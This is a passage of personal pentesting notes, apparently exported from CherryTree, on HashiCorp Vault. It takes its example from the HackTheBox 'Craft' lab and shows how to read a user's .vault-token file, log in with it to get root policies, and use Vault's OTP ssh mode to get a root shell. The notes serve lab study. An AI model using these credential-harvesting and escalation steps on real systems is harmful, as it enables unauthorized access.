<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vault</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Vault</h1></strong><br /><a href="https://www.hashicorp.com/products/vault/">https://www.hashicorp.com/products/vault/</a><br /><br /><code>Vault</code>, according to the site, is a virtual filesystem that will hold sensitive information/keys/passwords.<br /><br /><strong><h2>## About</h2></strong><br /><strong><h3>### Commands</h3></strong><br /><code>vault -h</code> will list commands<br /><br /><strong><h3>### Secrets</h3></strong><br /><strong>#### What is a Secrets Engine?</strong> <br />(from Vault Docs)<br /><br />Vault behaves similarly to a <a href="https://en.wikipedia.org/wiki/Virtual_file_system">virtual filesystem</a>. The read/write/delete/list operations are forwarded to the corresponding secrets engine, and the secrets engine decides how to react to those operations.<br /><br />This abstraction is incredibly powerful. It enables Vault to interface directly with physical systems, databases, HSMs, etc. But in addition to these physical systems, Vault can interact with more unique environments like AWS IAM, dynamic SQL user creation, etc. all while using the same read/write interface.<br /><br /><strong>#### List secrets</strong><br /><code>vault secrets list</code> will list secrets<br />The following secrets are all default<br /><div class="codebox"><div class="codebox">cubbyhole/<br />identity/<br />kv/<br />secret/<br />sys/</div></div><br /><br /><strong>#### Read secrets</strong><br /><code>vault read &lt;path to secret&gt;</code> will read secrets<br /><code>vault kv get &lt;path to secret&gt;</code> will also read a secret<br /><br /><strong><h3>### .vault-token</h3></strong><br />If you list the contents of a user&#39;s home directory, you might find a <code>.vault-token</code><br /><div class="codebox"><div class="codebox">gilfoyle@craft:~$&nbsp;ls&nbsp;-alh<br />total&nbsp;68K<br />drwx------&nbsp;4&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Aug&nbsp;19&nbsp;06:31&nbsp;.<br />drwxr-xr-x&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;..<br />-rw-r--r--&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;634&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.bashrc<br />drwx------&nbsp;3&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.config<br />-rwxr-xr-x&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;31K&nbsp;Aug&nbsp;17&nbsp;22:59&nbsp;lse.sh<br />-rw-r--r--&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;148&nbsp;Feb&nbsp;&nbsp;8&nbsp;&nbsp;2019&nbsp;.profile<br />drwx------&nbsp;2&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.ssh<br />-r--------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;&nbsp;33&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;user.txt<br />-rw-------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;&nbsp;36&nbsp;Aug&nbsp;19&nbsp;07:16&nbsp;.vault-token<br />-rw-------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;2.5K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.viminfo</div></div><br /><br /><div class="codebox"><div class="codebox">gilfoyle@craft:~$&nbsp;cat&nbsp;.vault-token<br />f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</div></div><br /><br />You can log in to <code>Vault</code> using the token. <br />It should tell you the permissions you have with the token (in this example we have root permissions).<br /><div class="codebox"><div class="codebox">gilfoyle@craft:~$&nbsp;vault&nbsp;login<br />Token&nbsp;(will&nbsp;be&nbsp;hidden):&nbsp;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br />Success!&nbsp;You&nbsp;are&nbsp;now&nbsp;authenticated.&nbsp;The&nbsp;token&nbsp;information&nbsp;displayed&nbsp;below<br />is&nbsp;already&nbsp;stored&nbsp;in&nbsp;the&nbsp;token&nbsp;helper.&nbsp;You&nbsp;do&nbsp;NOT&nbsp;need&nbsp;to&nbsp;run&nbsp;&quot;vault&nbsp;login&quot;<br />again.&nbsp;Future&nbsp;Vault&nbsp;requests&nbsp;will&nbsp;automatically&nbsp;use&nbsp;this&nbsp;token.<br /><br />Key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Value<br />---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----<br />token&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br />token_accessor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1dd7b9a1-f0f1-f230-dc76-46970deb5103<br />token_duration&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;âˆž<br />token_renewable&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false<br />token_policies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[&quot;root&quot;]<br />identity_policies&nbsp;&nbsp;&nbsp;&nbsp;[]<br />policies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[&quot;root&quot;]</div></div><br /><br /><strong><h2>## Exploit</h2></strong><br /><strong><h3>### ssh secret</h3></strong><br />If you&#39;ve found an <code>ssh</code> secret, <code>vault</code> has an ssh command that will let you <code>ssh</code> using that secret <br />(to log in as another user).<br />Docs for the <code>ssh</code> command are here - <a href="https://www.vaultproject.io/docs/commands/ssh.html">https://www.vaultproject.io/docs/commands/ssh.html</a><br /><br /><strong>Example</strong> <strong>from hackthebox Craft</strong><br /><div class="codebox"><div class="codebox">gilfoyle@craft:~$&nbsp;vault&nbsp;ssh&nbsp;-mode=otp&nbsp;-role=root_otp&nbsp;root@10.10.10.110<br />Vault&nbsp;could&nbsp;not&nbsp;locate&nbsp;&quot;sshpass&quot;.&nbsp;The&nbsp;OTP&nbsp;code&nbsp;for&nbsp;the&nbsp;session&nbsp;is&nbsp;displayed<br />below.&nbsp;Enter&nbsp;this&nbsp;code&nbsp;in&nbsp;the&nbsp;SSH&nbsp;password&nbsp;prompt.&nbsp;If&nbsp;you&nbsp;install&nbsp;sshpass,<br />Vault&nbsp;can&nbsp;automatically&nbsp;perform&nbsp;this&nbsp;step&nbsp;for&nbsp;you.<br />OTP&nbsp;for&nbsp;the&nbsp;session&nbsp;is:&nbsp;7ae5ce54-450d-e696-e628-fa9e81e2a9ba<br /><br /><br />&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;..&nbsp;&nbsp;.&nbsp;*&nbsp;&nbsp;*<br />*&nbsp;&nbsp;*&nbsp;@()Ooc()*&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp;.<br />&nbsp;&nbsp;&nbsp;&nbsp;(Q@*0CG*O()&nbsp;&nbsp;___<br />&nbsp;&nbsp;&nbsp;|\_________/|/&nbsp;_&nbsp;\<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;/&nbsp;|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;\_|&nbsp;|<br />&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|\___/<br />&nbsp;&nbsp;&nbsp;|\_|__|__|_/|<br />&nbsp;&nbsp;&nbsp;&nbsp;\_________/<br /><br /><br /><br />Password:&nbsp;7ae5ce54-450d-e696-e628-fa9e81e2a9ba<br />Linux&nbsp;craft.htb&nbsp;4.9.0-8-amd64&nbsp;#1&nbsp;SMP&nbsp;Debian&nbsp;4.9.130-2&nbsp;(2018-10-27)&nbsp;x86_64<br />...<br />root@craft:~#&nbsp;</div></div><br /><br /></div>
</body>
</html>
